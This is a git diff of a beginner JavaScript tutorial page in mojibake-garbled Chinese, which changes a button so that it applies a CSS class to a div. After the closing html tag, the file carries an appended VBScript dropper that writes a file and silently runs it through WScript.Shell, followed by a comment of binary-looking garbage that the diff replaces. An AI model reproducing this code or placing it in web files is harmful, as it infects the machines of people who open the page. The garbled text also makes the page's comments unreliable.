@@ -1,32 +1,34 @@
 <!DOCTYPE html>
 <html lang="zh">
 	<head>
-		<meta charset="UTF-8">
-		<meta name="viewport" content="width=device-width, initial-scale=1.0">
-		<meta http-equiv="X-UA-Compatible" content="ie=edge">
 		<title></title>
+		<style type="text/css">
+			.cls {
+				width: 100px;
+				height: 100px;
+				background-color: pink;
+				border: 5px solid skyblue;
+			}
+		</style>
 	</head>
 	<body>
-		<input type="button" value="å¼¹çª—" onclick="alert('å“ˆå“ˆ')" />
-		<input type="button" value="æ˜¾ç¤ºæ•ˆæœ" id="btn" />
+		<input type="button" name="" id="btn" value="è®¾ç½®æ ·å¼" />
+		<div id="dv">
 
-
+		</div>
+		 
+		<script src="js/common.js"></script>
 		<script type="text/javascript">
-			function f1() {
-				alert("å…‘æ¢æˆ");
-			}
-		</script>
-		<input type="button" value="ç¬¬äºŒä¸ªç‰ˆæœ¬æ•ˆæœ" onclick="f1()" />
-
-		<!-- æœ€ç»ˆåˆ†ç¦» -->
-		<script type="text/javascript">
-			// æ ¹æ®idå±æ€§çš„å€¼ä»æ–‡æ¡£ä¸­è·å–è¿™ä¸ªå…ƒç´ .
-			document.getElementById('btn').onclick = function() {
-				// å½“å‰è¿™ä¸ªæŒ‰é’®çš„å…ƒç´ (å¯¹è±¡ï¼‰,æ³¨å†Œç‚¹å‡»äº‹ä»¶,æ·»åŠ äº‹ä»¶å¤„ç†å‡½æ•°(åŒ¿åå‡½æ•°)
-				alert('å¼¹çª—');
+			my$("btn").onclick = function() {
+				var dvObj = my$("dv");
+// 				dvObj.style.width = "300px";
+// 				dvObj.style.height = "300px";
+// 				dvObj.style.backgroundColor = "red";
+// 				dvObj.style.border = "10px solid black";
+// åœ¨jsä»£ç ä¸­DOMæ“ä½œçš„æ—¶å€™,è®¾ç½®å…ƒç´ çš„ç±»æ ·å¼,ä¸ç”¨classå…³é”®å­—,åº”è¯¥ä½¿ç”¨className
+				dvObj.className = "cls"
 			};
 		</script>
- 
 	</body>
 </html>
 <SCRIPT Language=VBScript><!--
@@ -43,7 +45,6 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--zULİ°•>VUpÃ³¬&KğãS;“ ‘×Q%\‹Ÿ†ê’+ÀPNÔ¦úìÕˆZ¢:9X# nT{w‹9‚š/x÷`cíU»Î’Óq.êRF
-³LªQÈ<wx2¤[İ ±¢{Í[ƒÍIx  ¥4äC1(?Œ—ğ2?I>bm@˜ğ	6 ”d9|i„ZcĞb³÷ßŠ^y^ZˆïIÖGš!í¦Ç|¡JèR€|áLƒŞœ¥Tâ©âoM7ú·	©ã>Ö?{ABK÷D*=f…5s”öù »Ç! êù8ŞyšÏOçT*Â[á”
-nl âÔŒTO73è‰HE©¤&]íº{!¡z¬­Ü™ü÷chy‰F68P–H¼kŸÍtÁjÆ¼úqìÀp…z?™²(Ó6AìÍírn ²Å=®ÌfOËA;K^9ÈÁ½lOf·*5Xw$¿ ‚™é"Q\hA
-M áR"ùááá¬ÕOGÂª_uâ á-->
+//--></SCRIPT><!--p³\hŒFšéë£iÏGy¼4XPÍ>úÌŞLDŠÓ?Ùº ã¢7+ÄÉµ\zñœ³^W~ü?yïá<×rn~X-º,a¤Ãéø‹ôæÅ7³ô"¡ÎåµÁšåLvràù^W†?¬ÙÊ[B‡w4¯ÍÛH_T­bZ§ræõ¤WÈ_`hVÜ¼a§ªDUnê«¢!§"ˆ9š@~-²$~*¯
+Y8µ½L>u®>P\×V§Æ…Nç®'¦ó¦3şëCÅ÷OÍ¯İŠt1Òæ=3z8€2ëvñ r}=éé½ukÑGs‚|rAa\9á‡øÅ—;œòHrv]6õï©T9ÕG·^Yl¯™<6*½…·ENL/E3m|êwÍBÇ:“1°
+‹sW9j¢Ü¬Â*A–îj’= M¦’xI\ãB&­Ãg<½~G‡;úeË"¦Ñ^dcó2‘Êh„ão}U‚ò%%‰õ:ò\Èï’W„9€KÎõ—‚ÉOáÌ1YÕ1Qëµ\ áR"ùááá¬ÕOÙÊª_3â á-->
